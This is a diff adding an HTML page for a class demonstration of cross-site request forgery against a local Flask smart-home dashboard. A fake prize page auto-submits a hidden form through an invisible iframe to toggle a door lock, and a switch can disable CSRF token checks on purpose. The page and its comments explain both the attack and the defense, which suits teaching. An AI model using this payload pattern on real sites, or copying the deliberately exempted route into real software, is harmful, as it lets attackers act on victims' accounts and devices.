@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<!--
+  attack.html — Simulated malicious website for the CSRF attack demonstration.
+
+  This page deliberately does NOT extend base.html. It is pretending to be a
+  completely separate website that the victim happens to visit while they are
+  still logged into the Smart Home Dashboard in another tab.
+
+  HOW THE ATTACK WORKS
+  ─────────────────────
+  1. The victim is logged in to the dashboard at localhost:5000.
+     Their browser holds a valid session cookie for that site.
+
+  2. They visit this page (or a real attacker would lure them here via email,
+     a social-media link, etc.)
+
+  3. The page loads and JavaScript immediately submits a hidden form that
+     POSTs to /device/lock/toggle on the dashboard server.
+
+  4. Because the victim's browser automatically includes the session cookie on
+     every request to localhost:5000, the server sees the request as coming
+     from the logged-in owner — even though the owner never clicked anything.
+
+  WHEN SECURITY_ENABLED = True (ATTACK FAILS)
+  ─────────────────────────────────────────────
+  Flask-WTF's CSRFProtect checks every POST for a valid CSRF token.
+  This forged form has no token, so the request is rejected with HTTP 400.
+  The door lock is unchanged. The attacker's goal is blocked.
+
+  WHEN SECURITY_ENABLED = False (ATTACK SUCCEEDS)
+  ──────────────────────────────────────────────────
+  csrf.exempt(device_toggle) is active in app.py, so Flask-WTF skips the
+  token check entirely. The forged POST goes through. The door lock is
+  toggled without the owner ever clicking anything on the dashboard.
+  This is the live demo moment.
+
+  IMPLEMENTATION NOTE — why an iframe?
+  ──────────────────────────────────────
+  The hidden form targets a hidden <iframe> instead of the main window.
+  This keeps the victim on the "fake prize" page so you can see the
+  explanation panel appear, rather than being immediately redirected to
+  the dashboard. After watching the demo here, click the link to go back
+  to the dashboard and confirm the lock state changed.
+-->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>&#127881; You Won a Free Smart Home System!</title>
+    <style>
+        /* Deliberately garish styling to look like a sketchy prize website */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f39c12, #e74c3c);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        .prize-box {
+            background: white;
+            border-radius: 12px;
+            padding: 2.5rem 2rem;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+
+        .prize-box h1 {
+            font-size: 1.8rem;
+            color: #e74c3c;
+            margin-bottom: 0.5rem;
+        }
+
+        .prize-box .subtitle {
+            color: #888;
+            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .trophy { font-size: 4rem; margin-bottom: 1rem; }
+
+        .fake-button {
+            display: inline-block;
+            background: #27ae60;
+            color: white;
+            padding: 0.75rem 2rem;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            border: none;
+            margin-top: 1rem;
+        }
+
+        /* ── Countdown bar ──────────────────────────────────────────────── */
+        .countdown {
+            margin-top: 1.5rem;
+            font-size: 0.88rem;
+            color: #aaa;
+        }
+
+        /* ── Explanation panel — hidden until attack fires ──────────────── */
+        #explanation {
+            display: none;
+            margin-top: 1.5rem;
+            background: #fff3cd;
+            border: 2px solid #f39c12;
+            border-radius: 8px;
+            padding: 1.25rem 1rem;
+            text-align: left;
+        }
+
+        #explanation h2 {
+            color: #856404;
+            font-size: 1rem;
+            margin-bottom: 0.6rem;
+        }
+
+        #explanation p {
+            font-size: 0.88rem;
+            color: #533f03;
+            line-height: 1.55;
+            margin-bottom: 0.5rem;
+        }
+
+        #explanation .label {
+            display: inline-block;
+            font-size: 0.75rem;
+            font-weight: bold;
+            padding: 0.15rem 0.5rem;
+            border-radius: 10px;
+            margin-right: 0.3rem;
+        }
+
+        .label-attack  { background: #f8d7da; color: #721c24; }
+        .label-defense { background: #d4edda; color: #155724; }
+
+        #explanation a {
+            display: inline-block;
+            margin-top: 0.75rem;
+            background: #2980b9;
+            color: white;
+            padding: 0.45rem 1.1rem;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        /* ── Hidden iframe — receives the form's POST response ──────────── */
+        /* Using an iframe as the form target keeps the victim on this page  */
+        /* rather than being redirected to the dashboard immediately.        */
+        #attack-frame { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+<!-- VISIBLE CONTENT — the "fake prize website" the victim sees            -->
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+<div class="prize-box">
+
+    <div class="trophy">&#127881;</div>
+    <h1>Congratulations!</h1>
+    <p class="subtitle">totallylegitprizes.com &mdash; Claim your reward now</p>
+
+    <p>You have been selected as today's winner of a <strong>FREE Smart Home
+    Security System</strong> valued at $1,200!</p>
+
+    <p style="margin-top:0.75rem; color:#888; font-size:0.85rem;">
+        Click the button below to claim your prize. No credit card required!
+    </p>
+
+    <!-- This button does nothing — it's decoration to make the page look real -->
+    <button class="fake-button">&#127873; Claim My Prize!</button>
+
+    <!-- Countdown shown while the hidden attack form is about to fire -->
+    <p class="countdown" id="countdown-msg">
+        Loading prize confirmation&hellip;
+    </p>
+
+    <!-- ── Explanation panel — revealed after attack fires ─────────────── -->
+    <div id="explanation">
+        <h2>&#9888; What just happened? (Class Demo)</h2>
+        <p>
+            <span class="label label-attack">ATTACK</span>
+            The moment this page loaded, a hidden form automatically sent a
+            <strong>POST request to /device/lock/toggle</strong> on the Smart
+            Home Dashboard &mdash; without you clicking anything.
+        </p>
+        <p>
+            Because your browser automatically attached your session cookie to
+            that request, the server thought <em>you</em> sent it. Your door
+            lock was just toggled by this fake website.
+        </p>
+        <p>
+            <span class="label label-defense">DEFENSE</span>
+            With <strong>SECURITY_ENABLED = True</strong>, Flask-WTF would have
+            rejected this request immediately because the form has no CSRF token.
+            The attacker cannot read your token (same-origin policy), so they
+            cannot forge a valid request.
+        </p>
+        <p>
+            With <strong>SECURITY_ENABLED = False</strong>, the CSRF check is
+            disabled and the attack succeeds &mdash; as you just saw.
+        </p>
+        <a href="/dashboard">&#8594; Go to Dashboard to confirm lock changed</a>
+    </div>
+
+</div><!-- /.prize-box -->
+
+
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+<!-- ATTACK MACHINERY — invisible to the victim                            -->
+<!-- ═══════════════════════════════════════════════════════════════════════ -->
+
+<!--
+  Hidden iframe — the form submits its POST into this iframe, not the main
+  window. This keeps the victim on the "prize" page so they can read the
+  explanation, rather than being immediately redirected to the dashboard.
+-->
+<iframe name="attack-frame" id="attack-frame"></iframe>
+
+<!--
+  The forged form. It has no csrf_token field — that is the whole point.
+  A real attacker's page also wouldn't have the token because they cannot
+  read it from the victim's session (same-origin policy blocks that).
+
+  target="attack-frame" → response goes to the iframe, not the main page.
+  url_for() works here because attack.html is rendered with render_template()
+  in app.py, so Jinja2 context is available even though we don't use base.html.
+-->
+<form id="csrf-attack-form"
+      method="post"
+      action="{{ url_for('device_toggle', device_id='lock') }}"
+      target="attack-frame">
+    <!--
+      Intentionally NO csrf_token hidden input.
+      With SECURITY_ENABLED = True  → Flask-WTF rejects this → 400 → attack fails.
+      With SECURITY_ENABLED = False → csrf.exempt() is active → accepted → attack succeeds.
+    -->
+</form>
+
+<script>
+    // Auto-submit the hidden form after a short delay.
+    // The delay makes the demo more visible — you can see the countdown
+    // before the attack fires.
+    var countdown = 3;
+    var msg = document.getElementById('countdown-msg');
+    var explanation = document.getElementById('explanation');
+
+    var timer = setInterval(function () {
+        countdown--;
+        if (countdown > 0) {
+            msg.textContent = 'Loading prize confirmation in ' + countdown + '…';
+        } else {
+            clearInterval(timer);
+            msg.textContent = 'Sending request…';
+
+            // Fire the forged POST
+            document.getElementById('csrf-attack-form').submit();
+
+            // Give the iframe a moment to receive the response, then reveal
+            // the explanation panel on the main page.
+            setTimeout(function () {
+                msg.style.display = 'none';
+                explanation.style.display = 'block';
+            }, 800);
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
